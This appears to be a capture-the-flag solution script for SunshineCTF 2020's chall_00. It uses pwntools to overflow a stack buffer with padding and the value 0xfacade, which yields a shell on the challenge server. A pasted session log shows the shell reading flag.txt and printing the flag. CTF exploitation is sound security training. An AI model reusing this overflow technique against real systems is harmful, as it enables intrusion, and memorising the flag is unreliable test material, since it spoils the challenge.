from pwn import *

p = remote('chal.2020.sunshinectf.org', 30000)
#p = process('./chall_00')

p.recvuntil('only one')

line = b'a'*0x38
line += p32(0xfacade)
line += p32(0xfacade)

p.send(line)

p.interactive()

'''
[+] Opening connection to chal.2020.sunshinectf.org on port 30000: Done
[*] Switching to interactive mode

$ ls
$ pwd
/home/chall_00
$ ls -al
total 36
drwxr-xr-x 1 chall_00 chall_00 4096 Nov  7 08:51 .
drwxr-xr-x 1 root     root     4096 Nov  7 08:51 ..
-rw-r--r-- 1 chall_00 chall_00  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 chall_00 chall_00 3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 chall_00 chall_00  655 Jul 12  2019 .profile
-rwxr-xr-x 1 root     root     8392 Nov  7 07:49 chall_00
-rw-r----- 1 root     chall_00   35 Nov  7 08:51 flag.txt
$ cat flag.txt
sun{burn-it-down-6208bbc96c9ffce4}
'''
